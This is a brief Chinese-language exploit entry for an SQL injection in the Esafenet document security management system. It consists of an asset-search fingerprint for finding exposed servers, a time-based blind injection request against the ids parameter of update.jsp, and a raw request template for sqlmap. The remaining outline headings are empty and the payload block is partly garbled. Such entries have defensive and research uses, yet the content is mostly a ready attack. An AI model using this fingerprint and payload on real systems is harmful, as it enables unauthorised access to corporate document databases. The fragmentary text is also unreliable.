# 亿赛通电子文档安全管理系统ids存在SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```

sqlmap
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)%20 HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
```

**其他**
- 亿赛通电子文档安全管理系统ids存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统